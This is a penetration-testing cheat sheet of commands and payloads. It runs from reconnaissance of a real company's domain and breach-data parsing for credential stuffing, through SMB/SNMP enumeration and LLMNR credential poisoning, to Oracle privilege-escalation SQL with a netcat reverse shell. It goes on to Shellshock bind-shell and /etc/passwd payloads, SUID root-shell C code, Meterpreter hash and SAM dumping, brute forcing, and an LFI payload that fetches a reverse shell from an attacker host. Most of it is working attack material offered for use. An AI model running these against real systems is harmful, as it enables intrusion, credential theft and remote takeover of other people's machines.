Email Recon:
============
# search for public info on emails 
https://hunter.io/users/sign_in

# search through known breaches for usernames and passwords (for credential stuffing)
https://github.com/hmaverickadams/breach-parse
./breach-parse.sh @tesla.com tesla.txt
will create: 
tesla-master.txt
tesla-passwords.txt
tesla-users.txt

# theharvester
# -d is the target, -l is how many searches deep you want to go, -b search engine to use
# will return emails, domains, and ip addresses
theharvester -d tesla.com -l 500 -b google


Target Validation:
==================

# WHOIS enumeration
whois domain-name-here.com 

# NSLOOKUP

# DNSRecon


Finding Subdomains:
===================
# sublist3r
sudo apt install sublist3r
# -d for domain, -t threads
sublist3r -d tesla.com -t 100

# crt.sh website certificate finger printing
https://crt.sh use search bar
% = wildcard
Example: %.tesla.com will search *.tesla.com

# owasp amass (best tool for searching out sub domains)
lookup ono github

# tomnomnom httprobe tool can be used to verify the list of websites

# dig
# Perform DNS IP Lookup
dig a domain-name-here.com @nameserver 
# Perform MX Record Lookup
dig mx domain-name-here.com @nameserver
# Perform Zone Transfer with DIG
dig axfr domain-name-here.com @nameserver

# DNS Zone Transfers
# Windows DNS zone transfer
nslookup -> set type=any -> ls -d blah.com 
# Linux DNS zone transfer
dig axfr blah.com @ns1.blah.com

# googlefu
site:tesla.com 
site:tesla.com -www
#searches the site without the www part of the url
site:tesla.com filetype:docx
site:tesla.com filetype:pdf

nmap

bluto


fingerprinting:
===============
nmap 

netcat

# wappalyzer (firefox add-on)
# will return what was used to build the website. 

# https://builtwith.com
# will return what was used to build the website. 

# whatweb (command line tool built into kali)
whatweb https://tesla.com
# will return what was used to build the website. 



data breaches:
==============
HaveIBeenPwned

BreachParse

WeLeakInfo








# AutoRecon
===========
# https://github.com/Tib3rius/AutoRecon
git clone https://github.com/Tib3rius/AutoRecon.git
python3 -m pip install requirements.txt
python3 autorecon.py -h
python3 autorecon.py -h <IP-ADDRESS>


# DNS
=====
# WHOIS enumeration
whois domain-name-here.com 

# Perform DNS IP Lookup
dig a domain-name-here.com @nameserver 

# Perform MX Record Lookup
dig mx domain-name-here.com @nameserver

# Perform Zone Transfer with DIG
dig axfr domain-name-here.com @nameserver

# DNS Zone Transfers
# Windows DNS zone transfer
nslookup -> set type=any -> ls -d blah.com 

# Linux DNS zone transfer
dig axfr blah.com @ns1.blah.com



# Email
=======
# Simply Email
# Use Simply Email to enumerate all the online places (github, target site etc), 
# it works better if you use proxies or set long throttle times 
# so google doesn’t think you’re a robot and make you fill out a Captcha.

curl -s https://raw.githubusercontent.com/killswitch-GUI/SimplyEmail/master/setup/oneline-setup.sh | bash
cd SimplyEmail
./SimplyEmail.py -all -e TARGET-DOMAIN

# Simply Email can verify the discovered email addresss after gathering.



# Semi Active Information Gathering
===================================
# Basic Finger Printing
# Manual finger printing / banner grabbing.

COMMAND				        DESCRIPTION
nc -v 192.168.1.1 25		# Basic versioning / finger printing via displayed banner
telnet 192.168.1.1 25		# Basic versioning / finger printing via displayed banner

# Banner grabbing with NC
nc TARGET-IP 80

GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>



# Active Information Gathering
==============================
# DNS Bruteforce
# DNSRecon
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml



# Port Scanning
===============
# Nmap Basic Commands
COMMAND						                                                DESCRIPTION
nmap -v -sS -A -T4 target			                                        Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services
nmap -v -sS -p--A -T4 target			                                    As above but scans all TCP ports (takes a lot longer)
nmap -v -sU -sS -p- -A -T4 target		                                    As above but scans all TCP ports and UDP scan (takes even longer)
nmap -v -p 445 --script=smb-check-vulns	--script-args=unsafe=1 192.168.1.X	Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover
nmap -vv -Pn -A -sC -sS -T 4 -p- 10.0.0.1                                   Verbose, syn, all ports, all scripts, no ping
nmap -v -sS -A -T4 x.x.x.x                                                  Verbose, SYN Stealth, Version info, and scripts against services.
nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]         Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1        FTP Enumeration
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.0.0.1              SMTP Enumeration
ls /usr/share/nmap/scripts/* | grep ftp		                                Search nmap scripts for keywords

# Nmap UDP Scanning
nmap -sU TARGET 				


The following commands will scan for open ports on a target IP (from hackthebox.eu):
 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.27 


nc -nvv INSERTIPADDRESS 25                                                  SMTP Enumeration
telnet INSERTIPADDRESS 25                                                   SMTP Enumeration
netdiscover -r 192.168.1.0/24                                               General Enumeration


# UDP Protocol Scanner
======================
git clone https://github.com/portcullislabs/udp-proto-scanner.git

# Scan a file of IP addresses for all services:
./udp-protocol-scanner.pl -f ip.txt 

# Scan for a specific UDP service:
udp-proto-scanner.pl -p ntp -f ips.txt

# Other Host Discovery
COMMAND							            DESCRIPTION
netdiscover -r 192.168.1.0/24				Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site



# Enumeration & Attacking Network Services
==========================================
# SAMB / SMB / Windows Domain Enumeration
# SMB Enumeration Tools
nmblookup -A target
smbclient //MOUNT/share -I target -N
smbclient -N -L \\\\10.10.10.27\\
rpcclient -U "" target
enum4linux target

# nbtscan cheat sheet 
COMMAND							        DESCRIPTION
nbtscan 192.168.1.0/24					Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
enum4linux -a target-ip					Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing

# Fingerprint SMB Version
smbclient -L //192.168.1.100 

# Find open SMB Shares
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   

# Enumerate SMB Users
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 

# python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX

# RID Cycling:
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt

# Metasploit module for RID cycling:
use auxiliary/scanner/smb/smb_lookupsid

# Manual Null session testing:
# Windows:
net use \\TARGET\IPC$ "" /u:""

# Linux:
smbclient -L //192.168.99.131

# NBTScan unixwiz
# Install on Kali rolling:
apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan

# LLMNR / NBT-NS Spoofing
# Steal credentials off the network.
# Metasploit LLMNR / NetBIOS requests
# Spoof / poison LLMNR / NetBIOS requests:
auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response

# Capture the hashes:
auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
# You’ll end up with NTLMv2 hash, use john or hashcat to crack it.


# Responder.py
# Alternatively you can use responder.
git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
# Run Responder.py for the whole engagement while you're working on other attack vectors.


SMB User Enumeration:                                                                       COMMAND	DESCRIPTION:
=====================                                                                       ====================
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX              Enumerate users from SMB
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt                                               RID cycle SMB / enumerate users from SMB


SNMP User Enumeration:                                                                      COMMAND DESCRIPTION:
======================                                                                      ====================
snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d” “ -f4                          Enmerate users from SNMP
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX           Enmerate users from SNMP
nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt  (then grep)                         Search for SNMP servers with nmap, grepable output


# SNMP Enumeration Tools
========================
# Fix SNMP output values so they are human readable:
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf

# SNMP enumeration
snmpcheck -t 192.168.1.X -c public			
snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName|cut -d* * -f 
snmpenum -t 192.168.1.X
onesixtyone -c names -i hosts

# SNMPv3 Enumeration Tools
# Idenitfy SNMPv3 servers with nmap:
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET

# Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:
apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb

# Use Metasploits Wordlist
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt



# RSH Enumeration
=================
# nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:
# RSH Run Commands
rsh <target> <command>

# Metasploit RSH Login Scanner
auxiliary/scanner/rservices/rsh_login

# rusers Show Logged in Users
rusers -al 192.168.2.1

# rusers scan whole Subnet
rlogin -l <user> <target>
# e.g rlogin -l root TARGET-SUBNET/24



# Finger Enumeration
====================
finger @TARGET-IP

# Finger a Specific Username
finger batman@TARGET-IP 

# Solaris bug that shows all logged in users:
finger 0@host  

# SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost 



# rwho
======
# Use nmap to identify machines running rwhod (513 UDP)



# TLS & SSL Testing
===================
# testssl.sh
# Test all the things on a single host and output to a .html file:
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html  



# Vulnerability Assessment
==========================
# Install OpenVAS 8 on Kali Rolling:
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup

# Verify openvas is running using:
netstat -tulpn
Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup.



# Database Penetration Testing
==============================
# Attacking database servers exposed on the network.

# Oracle
# Install oscanner:
apt-get install oscanner  

# Run oscanner:
oscanner -s 192.168.1.200 -P 1521 

# Fingerprint Oracle TNS Version
# Install tnscmd10g:
apt-get install tnscmd10g

# Fingerprint oracle tns:
tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 

# Brute force oracle user accounts
# Identify default Oracle accounts:
nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 

# Run nmap scripts against Oracle TNS:
nmap -p 1521 -A TARGET



# Oracle Privilege Escalation
=============================
# Requirements:

#  Oracle needs to be exposed on the network
# A default account is in use like scott
# Quick overview of how this works:

# Create the function
# Create an index on table SYS.DUAL
# The index we just created executes our function SCOTT.DBA_X
# The function will be executed by SYS user (as that’s the user that owns the table).
# Create an account with DBA priveleges
# In the example below the user SCOTT is used but this should be possible with another default Oracle account.

# Identify default accounts within oracle db using NMAP NSE scripts:
nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 
# Login using the identified weak account (assuming you find one).


# How to identify the current privilege level for an oracle user:
SQL> select * from session_privs; 

SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;


# Oracle priv esc and obtain DBA access:
# Run netcat: netcat -nvlp 443code>
SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));

# Run the exploit with a select query:
SQL> Select * from session_privs; 

# You should have a DBA user with creds user1 and pass1.
# Verify you have DBA privileges by re-running the first command again.
# Remove the exploit using:
drop index exploit_1337; 

# Get Oracle Reverse os-shell:
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 



# MSSQL
=======
# Enumeration / Discovery:
# Nmap:
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156

# Metasploit:
msf > use auxiliary/scanner/mssql/mssql_ping

# Bruteforce MSSQL Login
msf > use auxiliary/admin/mssql/mssql_enum

# Metasploit MSSQL Shell
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp



# VLAN Hopping
==============
# Using NCCGroups VLAN wrapper script for Yersina simplifies the process.
git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh 

# VPN Pentesting Tools
# Identify VPN servers:
./udp-protocol-scanner.pl -p ike TARGET(s)

# Scan a range for VPN servers:
./udp-protocol-scanner.pl -p ike -f ip.txt

# IKEForce
# Use IKEForce to enumerate or dictionary attack VPN servers.
# Install:
pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git

# Perform IKE VPN enumeration with IKEForce:
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic

# Bruteforce IKE VPN using IKEForce:
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1

ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key

# IKE Aggressive Mode PSK Cracking
# Identify VPN Servers
# Enumerate with IKEForce to obtain the group ID
# Use ike-scan to capture the PSK hash from the IKE endpoint
# Use psk-crack to crack the hash

# Step 1: Idenitfy IKE Servers
./udp-protocol-scanner.pl -p ike SUBNET/24

# Step 2: Enumerate group name with IKEForce
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic

# Step 3: Use ike-scan to capture the PSK hash
ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP

# Step 4: Use psk-crack to crack the PSK hash
psk-crack hash-file.txt

#Some more advanced psk-crack options below:
pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key



# PPTP Hacking
==============
# Identifying PPTP, it listens on TCP: 1723

# NMAP PPTP Fingerprint:
nmap –Pn -sV -p 1723 TARGET(S)

# PPTP Dictionary Attack
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst



# DNS Tunneling
===============
# Tunneling data over DNS to bypass firewalls.
# dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.

# Attacking Machine
# Installtion:
apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install

# Run dnscat2:
ruby ./dnscat2.rb
dnscat2> New session established: 1422
dnscat2> session -i 1422

# Target Machine:
# https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/
dnscat --host <dnscat server_ip>



# BOF (Buffer Over Flow)/ Exploit
=================================
# Exploit Research
# Find exploits for enumerated hosts / services.

COMMAND							DESCRIPTION
searchsploit windows 2003 | grep -i local		Search exploit-db for exploit, in this example windows 2003 + local esc

site:exploit-db.com exploit kernel <= 3			Use google to search exploit-db.com for exploits

grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/* 	Search metasploit modules using grep - msf search sucks a bit

# Searching for Exploits
# Install local copy of exploit-db:
searchsploit –u
searchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local



# Compiling Windows Exploits on Kali
====================================
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe  



# Cross Compiling Exploits
==========================
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)



# Exploiting Common Vulnerabilities
===================================
# Exploiting Shellshock
# A tool to find and exploit servers vulnerable to Shellshock:
git clone https://github.com/nccgroup/shocker
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
cat file (view file contents)
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80

# Shell Shock run bind shell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80

# Shell Shock reverse Shell
nc -l -p 443



# Simple Local Web Servers
==========================
# Python local web server command, handy for serving up shells and exploits on an attacking machine.

COMMAND							DESCRIPTION
python -m SimpleHTTPServer 80				Run a basic http server, great for serving up shells etc
python3 -m http.server					Run a basic Python3 http server, great for serving up shells etc
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"	Run a ruby webrick basic http server
php -S 0.0.0.0:80					Run a basic PHP http server



# Mounting File Shares
======================
#How to mount NFS / CIFS, Windows and Linux file shares.

COMMAND											DESCRIPTION
mount 192.168.1.1:/vol/share /mnt/nfs							Mount NFS share to /mnt/nfs
mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs	Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)
net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no		Mount a Windows share on Windows from the command line
apt-get install smb4k -y								Install smb4k on Kali, useful Linux GUI for browsing SMB shares



# HTTP / HTTPS Webserver Enumeration
====================================
COMMAND							DESCRIPTION
nikto -h 192.168.1.1			Perform a nikto scan against target
dirbuster						Configure via GUI, CLI input doesn't work most of the time
dirb http://10.0.0.1/
gobuster dir -u http://192.168.1.1 -P <Passwor> -U <username> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,htm,cgi -s 200



# Packet Inspection
===================
COMMAND							DESCRIPTION
tcpdump tcp port 80 -w output.pcap -i eth0		tcpdump for port 80 on interface eth0, outputs to output.pcap



# SMB User Enumeration
======================
COMMAND											DESCRIPTION
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX		Enumerate users from SMB
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt						RID cycle SMB / enumerate users from SMB
snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d” “ -f4			Enmerate users from SNMP
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX	Enmerate users from SNMP
nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt 					(then grep) Search for SNMP servers with nmap, grepable output



# Kali word lists
=================
/usr/share/wordlists



# Hydra Brute Force
===================
COMMAND										                                    DESCRIPTION
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V	    Hydra FTP brute force
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V	    Hydra POP3 brute force
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V			            Hydra SMTP brute force
# Use -t to limit concurrent connections, example: -t 15



# John The Ripper - JTR
=======================
COMMAND										DESCRIPTION
john --wordlist=/usr/share/wordlists/rockyou.txt hashes				JTR password cracking
john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt	JTR forced descrypt cracking with wordlist
john --format=descrypt hash --show						JTR forced descrypt brute force cracking








# Compiling Exploits
====================
# Some notes on compiling exploits.

# Identifying if C code is for Windows or Linux
# C includes will indicate which OS should be used to build the exploit.

COMMAND											DESCRIPTION
process.h, string.h, winbase.h, windows.h, winsock2.h					Windows exploit code
arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h		Linux exploit code


#Build Exploit GCC
COMMAND								DESCRIPTION
gcc -o exploit exploit.c					Basic GCC compile

# GCC Compile 32Bit Exploit on 64Bit Kali
# Handy for cross compiling 32 bit binaries on 64 bit attacking machines.
COMMAND								DESCRIPTION
gcc -m32 exploit.c -o exploit					Cross compile 32 bit binary on 64 bit Linux

# Compile Windows .exe on Linux
# Build / compile windows exploits on Linux, resulting in a .exe file.
COMMAND								DESCRIPTION
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe		Compile windows .exe on Linux



# SUID Binary
=============
# Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.
# below are some quick copy and pate examples for various shells:

# SUID C Shell for /bin/bash
============================
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}       

# SUID C Shell for /bin/sh
==========================
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       

# Building the SUID Shell binary
gcc -o suid suid.c  

# For 32 bit:
gcc -m32 -o suid suid.c  



# TTY Shells
============
# Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.

# Python TTY Shell Trick
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')

# Spawn Interactive sh shell
/bin/sh -i

# Spawn Perl TTY Shell
exec "/bin/sh";
perl —e 'exec "/bin/sh";'

# Spawn Ruby TTY Shell
exec "/bin/sh"

# Spawn Lua TTY Shell
os.execute('/bin/sh')

# Spawn TTY Shell from Vi
# Run shell commands from vi:
:!bash

# Spawn TTY Shell NMAP
!sh



# Meterpreter Payloads
======================
# Windows reverse meterpreter payload
COMMAND							DESCRIPTION
set payload windows/meterpreter/reverse_tcp		Windows reverse tcp payload

# Windows VNC Meterpreter payload
COMMAND							DESCRIPTION
set payload windows/vncinject/reverse_tcp					
set ViewOnly false					Meterpreter Windows VNC Payload

# Linux Reverse Meterpreter payload
COMMAND							DESCRIPTION
set payload linux/meterpreter/reverse_tcp		Meterpreter Linux Reverse Payload

# Meterpreter Cheat Sheet
=========================
COMMAND							DESCRIPTION
upload file c:\\windows					Meterpreter upload file to Windows target
download c:\\windows\\repair\\sam /tmp			Meterpreter download file from Windows target
download c:\\windows\\repair\\sam /tmp			Meterpreter download file from Windows target
execute -f c:\\windows\temp\exploit.exe			Meterpreter run .exe on target - handy for executing uploaded exploits
execute -f cmd -c 					Creates new channel with cmd shell
ps							Meterpreter show processes
shell							Meterpreter get shell on the target
getsystem						Meterpreter attempts priviledge escalation the target
hashdump						Meterpreter attempts to dump the hashes on the target
portfwd add –l 3389 –p 3389 –r target			Meterpreter create port forward to target machine
portfwd delete –l 3389 –p 3389 –r target		Meterpreter delete port forward



# Common Metasploit Modules
===========================
# Remote Windows Metasploit Modules (exploits)
COMMAND								DESCRIPTION
use exploit/windows/smb/ms08_067_netapi				MS08_067 Windows 2k, XP, 2003 Remote Exploit
use exploit/windows/dcerpc/ms06_040_netapi			MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index	MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit

# Local Windows Metasploit Modules (exploits)
COMMAND								DESCRIPTION
use exploit/windows/local/bypassuac				Bypass UAC on Windows 7 + Set target + arch, x86/64

# Auxilary Metasploit Modules
COMMAND								DESCRIPTION
use auxiliary/scanner/http/dir_scanner				Metasploit HTTP directory scanner
use auxiliary/scanner/http/jboss_vulnscan			Metasploit JBOSS vulnerability scanner
use auxiliary/scanner/mssql/mssql_login				Metasploit MSSQL Credential Scanner
use auxiliary/scanner/mysql/mysql_version			Metasploit MSSQL Version Scanner
use auxiliary/scanner/oracle/oracle_login			Metasploit Oracle Login Module

# Metasploit Powershell Modules
COMMAND								DESCRIPTION
use exploit/multi/script/web_delivery				Metasploit powershell payload delivery module
post/windows/manage/powershell/exec_powershell			Metasploit upload and run powershell script through a session
use exploit/multi/http/jboss_maindeployer			Metasploit JBOSS deploy
use exploit/windows/mssql/mssql_payload				Metasploit MSSQL payload

# Post Exploit Windows Metasploit Modules
# Windows Metasploit Modules for privilege escalation.
COMMAND								DESCRIPTION
run post/windows/gather/win_privs				Metasploit show privileges of current user
use post/windows/gather/credentials/gpp				Metasploit grab GPP saved passwords
load mimikatz -> wdigest					Metasplit load Mimikatz
run post/windows/gather/local_admin_search_enum			Idenitfy other machines that the supplied domain user has administrative access to
run post/windows/gather/smart_hashdump				Automated dumping of sam file, tries to esc privileges etc



# CISCO IOS Commands
====================
COMMAND							DESCRIPTION
enable							Enters enable mode
conf t							Short for, configure terminal
(config)# interface fa0/0				Configure FastEthernet 0/0
(config-if)# ip addr 0.0.0.0 255.255.255.255		Add ip to fa0/0
(config-if)# ip addr 0.0.0.0 255.255.255.255		Add ip to fa0/0
(config-if)# line vty 0 4				Configure vty line
(config-line)# login					Cisco set telnet password
(config-line)# password YOUR-PASSWORD			Set telnet password
# show running-config					Show running config loaded in memory
# show startup-config					Show sartup config
# show version						show cisco IOS version
# show session						display open sessions
# show ip interface					Show network interfaces
# show interface e0					Show detailed interface info
# show ip route						Show routes
# show access-lists					Show access lists
# dir file systems					Show available files
# dir all-filesystems					File information
# dir /all						Show deleted files
# terminal length 0					No limit on terminal output
# copy running-config tftp				Copys running config to tftp server
# copy running-config startup-config			Copy startup-config to running-config



# Cryptography
==============
#Hash Lengths
HASH			SIZE
MD5 Hash Length		16 Bytes
SHA-1 Hash Length	20 Bytes
SHA-256 Hash Length	32 Bytes
SHA-512 Hash Length	64 Bytes

#Hash Examples
HASH				EXAMPLE
MD5 Hash Example		8743b52063cd84097a65d1633f5c74f5
MD5 $PASS:$SALT Example		01dfae6e5d4d90d9892622325959afbe:7050461
MD5 $SALT:$PASS			f0fda58630310a6dd91a7d8f0a4ceda2:4225637426
SHA1 Hash Example		b89eaac7e61417341b710b727768294d0e6a277b
SHA1 $PASS:$SALT		2fc5a684737ce1bf7b3b239df432416e0dd07357:2014
SHA1 $SALT:$PASS		cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024
SHA-256				127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935
SHA-256 $PASS:$SALT		c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4
SHA-256 $SALT:$PASS		eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617
SHA-512				82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f
SHA-512 $PASS:$SALT		e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd
SHA-512 $SALT:$PASS		976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a
NTLM Hash Example		b4b9b02e6f09a9bd760f388b67351e2b



# SQLMap Examples
==================
# A mini SQLMap cheat sheet:
COMMAND																		DESCRIPTION
sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3						Automated sqlmap scan
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php" 	Targeted sqlmap scan
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump 								Scan url for union + error based injection with mysql backend and use a random user agent + database dump
sqlmap -o -u "http://meh.com/form/" --forms													sqlmap check form for injection
sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump									sqlmap dump and crack hashes for table users on database-name.



# How to get a Shell from LFI
=============================
# Path Traversal aka Directory Traversal
# PHP Wrapper expect:// LFI
# Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.
# An example of PHP expect:
http://127.0.0.1/fileincl/example1.php?page=expect://ls

# Below is the error received if the PHP expect wrapper is disabled:
Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7

# PHP Wrapper php://file
========================
# Another PHP wrapper, php://input your payload is sent in a POST request using curl, 
# burp or hackbar to provide the post data is probably the easiest option.
# Example:
http://192.168.183.128/fileincl/example1.php?page=php://input

# Post Data payload, try something simple to start with like: 
# Then try and download a reverse shell from your attacking machine using:
<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>

# After uploading execute the reverse shell at http://192.168.183.129/shell.php


# PHP Wrapper php://filter
==========================
# Another PHP wrapper, php://filter in this example the output is encoded using base64, 
# so you’ll need to decode the output.
http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

# /proc/self/environ LFI Method
# If it’s possible to include /proc/self/environ from your vulnerable LFI script, 
# then code execution can be leveraged by manipulating the User Agent parameter with Burp. 
